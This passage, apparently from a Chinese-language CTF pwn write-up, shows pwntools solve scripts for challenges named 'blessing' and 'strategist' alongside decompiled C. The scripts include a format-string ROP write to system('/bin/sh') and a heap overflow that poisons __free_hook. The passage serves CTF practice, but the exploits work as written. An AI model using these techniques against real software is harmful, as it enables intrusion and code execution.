</span>    <span class="nf">add_entry</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="sa">f</span><span class="sh">'</span><span class="s">%</span><span class="si">{</span><span class="mi">6</span><span class="o">+</span><span class="mh">0x6</span><span class="si">}</span><span class="s">$hn</span><span class="sh">'</span><span class="p">)</span>

    <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base</span>
    <span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">]</span>
    <span class="n">bin_sh</span> <span class="o">=</span> <span class="nf">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="sh">'</span><span class="p">))</span>
    <span class="n">rdi</span> <span class="o">=</span> <span class="nf">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="nf">asm</span><span class="p">(</span><span class="sh">'</span><span class="s">pop rdi; ret</span><span class="sh">'</span><span class="p">)))</span>
    
    <span class="n">addr2</span> <span class="o">+=</span> <span class="mi">8</span>
    <span class="n">pay</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rdi</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">pay</span><span class="p">)):</span>
        <span class="n">t1</span> <span class="o">=</span> <span class="n">addr2</span> <span class="o">+</span> <span class="n">i</span>
        <span class="c1">#t2 = u8(pay[i])
</span>        <span class="n">t2</span> <span class="o">=</span> <span class="n">pay</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
        
        <span class="k">if</span> <span class="n">t1</span><span class="p">:</span>
            <span class="n">pay1</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">%</span><span class="si">{</span><span class="n">t1</span> <span class="o">&amp;</span> <span class="mh">0xFFFF</span><span class="si">}</span><span class="s">c%</span><span class="si">{</span><span class="mi">6</span><span class="o">+</span><span class="mh">0x29</span><span class="si">}</span><span class="s">$hn</span><span class="sh">'</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">pay1</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">%</span><span class="si">{</span><span class="mi">6</span><span class="o">+</span><span class="mh">0x29</span><span class="si">}</span><span class="s">$hn</span><span class="sh">'</span>
        <span class="k">if</span> <span class="n">t2</span><span class="p">:</span>
            <span class="n">pay2</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">%</span><span class="si">{</span><span class="n">t2</span> <span class="o">&amp;</span> <span class="mh">0xFFFF</span><span class="si">}</span><span class="s">c%</span><span class="si">{</span><span class="mi">6</span><span class="o">+</span><span class="mh">0x22</span><span class="si">}</span><span class="s">$hn</span><span class="sh">'</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">pay1</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">%</span><span class="si">{</span><span class="mi">6</span><span class="o">+</span><span class="mh">0x22</span><span class="si">}</span><span class="s">$hn</span><span class="sh">'</span>

        <span class="nf">add_entry</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">pay1</span><span class="p">)</span>
        <span class="nf">add_entry</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">pay2</span><span class="p">)</span>
        <span class="nf">add_entry</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="sa">f</span><span class="sh">'</span><span class="s">%</span><span class="si">{</span><span class="mi">6</span><span class="o">+</span><span class="mh">0x6</span><span class="si">}</span><span class="s">$hn</span><span class="sh">'</span><span class="p">)</span>
        <span class="c1">#pause()
</span>

    <span class="c1">#gdb.attach(io,gdbscript=gdbscript)
</span>    <span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">stack</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">elf_base</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">libc_base</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
    <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="blessing"><span class="me-2">blessing</span><a href="#blessing" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>‍</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
</pre></td><td class="rouge-code"><pre><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">size_t</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-28h] BYREF</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-20h]</span>
  <span class="n">_QWORD</span> <span class="o">*</span><span class="n">v6</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-18h]</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-10h]</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-8h]</span>

  <span class="n">v8</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">setup</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
  <span class="n">banner</span><span class="p">();</span>
  <span class="n">size</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="n">v6</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x30000uLL</span><span class="p">);</span>
  <span class="o">*</span><span class="n">v6</span> <span class="o">=</span> <span class="mi">1LL</span><span class="p">;</span>
  <span class="n">printstr</span><span class="p">(</span>
    <span class="s">"In the ancient realm of Eldoria, a roaming bard grants you good luck and offers you a gift!</span><span class="se">\n</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\n</span><span class="s">"</span>
    <span class="s">"Please accept this: "</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"%p"</span><span class="p">,</span> <span class="n">v6</span><span class="p">);</span>
  <span class="n">sleep</span><span class="p">(</span><span class="mi">1u</span><span class="p">);</span>
  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mh">0xD</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\b</span><span class="s"> </span><span class="se">\b</span><span class="s">"</span><span class="p">);</span>
    <span class="n">usleep</span><span class="p">(</span><span class="mh">0xEA60u</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span>
    <span class="s">"%s[%sBard%s]: Now, I want something in return...</span><span class="se">\n\n</span><span class="s">How about a song?</span><span class="se">\n\n</span><span class="s">Give me the song's length: "</span><span class="p">,</span>
    <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;34m"</span><span class="p">,</span>
    <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;32m"</span><span class="p">,</span>
    <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;34m"</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%lu"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">size</span><span class="p">);</span> <span class="c1">// 直接输入 v6的地址</span>
  <span class="n">buf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span> <span class="c1">// size太大 malloc会返回 0，buf = 0</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">%s[%sBard%s]: Excellent! Now tell me the song: "</span><span class="p">,</span> <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;34m"</span><span class="p">,</span> <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;32m"</span><span class="p">,</span> <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;34m"</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span> <span class="c1">// read(0, 0, size) </span>
  <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span> <span class="o">+</span> <span class="n">size</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span> <span class="c1">//buf + size = size,所以说会清空 v6[0]</span>
  <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="n">v6</span> <span class="p">)</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">%s[%sBard%s]: Your song was not as good as expected...</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;31m"</span><span class="p">,</span> <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;32m"</span><span class="p">,</span> <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;31m"</span><span class="p">);</span>
  <span class="k">else</span>
    <span class="n">read_flag</span><span class="p">();</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="n">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">([])</span>
<span class="c1">#gdb.attach(io,gdbscript)
</span><span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Please accept this: </span><span class="sh">'</span><span class="p">)</span>
<span class="n">addr</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="nf">r</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">addr</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">"</span><span class="s"> me the song</span><span class="sh">'</span><span class="s">s length: </span><span class="sh">"</span><span class="p">)</span>
<span class="c1">#size = 0x2FFF8
</span><span class="n">size</span> <span class="o">=</span> <span class="n">addr</span>
<span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>

<span class="nf">itr</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<h2 id="strategist"><span class="me-2">strategist</span><a href="#strategist" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>‍</p>

<ul>
  <li>菜单堆</li>
</ul>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="rouge-code"><pre><span class="kt">unsigned</span> <span class="n">__int64</span> <span class="kr">__fastcall</span> <span class="nf">edit_plan</span><span class="p">(</span><span class="n">__int64</span> <span class="o">*</span><span class="n">heap_list</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">size_t</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// rax</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">idx</span><span class="p">;</span> <span class="c1">// [rsp+14h] [rbp-Ch] BYREF</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]</span>

  <span class="n">v4</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">[%sSir Alaric%s]: Which plan you want to change?</span><span class="se">\n\n</span><span class="s">&gt; "</span><span class="p">,</span> <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;34m"</span><span class="p">,</span> <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;33m"</span><span class="p">,</span> <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;34m"</span><span class="p">);</span>
  <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">idx</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">idx</span> <span class="o">&gt;=</span> <span class="mh">0x64</span> <span class="o">||</span> <span class="o">!</span><span class="n">heap_list</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">[%sSir Alaric%s]: There is no such plan!</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;31m"</span><span class="p">,</span> <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;33m"</span><span class="p">,</span> <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;31m"</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">1312</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">[%sSir Alaric%s]: Please elaborate on your new plan.</span><span class="se">\n\n</span><span class="s">&gt; "</span><span class="p">,</span> <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;34m"</span><span class="p">,</span> <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;33m"</span><span class="p">,</span> <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;34m"</span><span class="p">);</span>
  <span class="n">v1</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">heap_list</span><span class="p">[</span><span class="n">idx</span><span class="p">]);</span> <span class="c1">// 漏洞点，堆块内容填满，会把下面chunk 的 size 也计算进去</span>
  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">heap_list</span><span class="p">[</span><span class="n">idx</span><span class="p">],</span> <span class="n">v1</span><span class="p">);</span>		 <span class="c1">// 堆溢出漏洞</span>
  <span class="n">putchar</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v4</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
</pre></td><td class="rouge-code"><pre><span class="n">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">([])</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">text</span><span class="o">=</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">s</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">text</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">s</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">rm</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">4</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>


<span class="nf">add</span><span class="p">(</span><span class="mh">0x448</span><span class="p">,</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x448</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mh">0xF8</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mh">0xF8</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mh">0xF8</span><span class="p">)</span>

<span class="n">pay</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x448</span> <span class="o">+</span> <span class="nf">p16</span><span class="p">(</span><span class="mh">0x201</span><span class="p">)</span>
<span class="nf">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">pay</span><span class="p">)</span>
<span class="nf">rm</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="nf">rm</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="nf">rm</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="nf">rm</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

<span class="nf">add</span><span class="p">(</span><span class="mh">0x18</span><span class="p">)</span>
<span class="nf">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">[0]: </span><span class="sh">'</span><span class="p">)</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="nf">uu64</span><span class="p">(</span><span class="nf">r</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span> <span class="o">-</span> <span class="mi">4112449</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">libc_base</span><span class="sh">'</span><span class="p">)</span>
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base</span>

<span class="n">pay</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0xF8</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x101</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">__free_hook</span><span class="sh">'</span><span class="p">])</span>
<span class="nf">add</span><span class="p">(</span><span class="mh">0x1F8</span><span class="p">,</span><span class="n">pay</span><span class="p">)</span>


<span class="nf">add</span><span class="p">(</span><span class="mh">0xF8</span><span class="p">,</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mh">0xF8</span><span class="p">,</span><span class="nf">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">]))</span>
<span class="nf">rm</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="nf">itr</span><span class="p">()</span>

</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<h2 id="contractor"><span class="me-2">contractor</span><a href="#contractor" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>‍</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
</pre></td><td class="rouge-code"><pre><span class="kt">unsigned</span> <span class="n">__int64</span> <span class="nf">contract</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]</span>

  <span class="n">v1</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">execl</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="s">"sh"</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v1</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">v3</span><span class="p">;</span> <span class="c1">// rsp</span>
  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-20h] BYREF</span>
  <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-1Ch]</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-18h]</span>
  <span class="kt">char</span> <span class="n">s1</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span> <span class="c1">// [rsp+1Ch] [rbp-Ch] BYREF</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v9</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-8h]</span>

  <span class="n">v9</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">v3</span> <span class="o">=</span> <span class="n">alloca</span><span class="p">(</span><span class="mh">0x130LL</span><span class="p">);</span>
  <span class="n">s</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v5</span><span class="p">;</span>
  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v5</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x128uLL</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span>
    <span class="s">"%s[%sSir Alaric%s]: Young lad, I'm truly glad you want to join forces with me, but first I need you to tell me some "</span>
    <span class="s">"things about you.. Please introduce yourself. What is your name?</span><span class="se">\n</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\n</span><span class="s">"</span>
    <span class="s">"&gt; "</span><span class="p">,</span>
    <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;34m"</span><span class="p">,</span>
    <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;33m"</span><span class="p">,</span>
    <span class="s">"</span><span class="se">\x1B</span><span class="s">[1;34m"</span><span class="p">);</span>
  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">i</span> <span class="o">&lt;=</span> <span class="mh">0xF</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">safe_buffer</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">safe_buffer</span> <span class="o">==</span> <span class="mi">10</span> <span class="p">)</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">safe_buffer</span><span class="p">;</span>
  <span class="p">}</span>
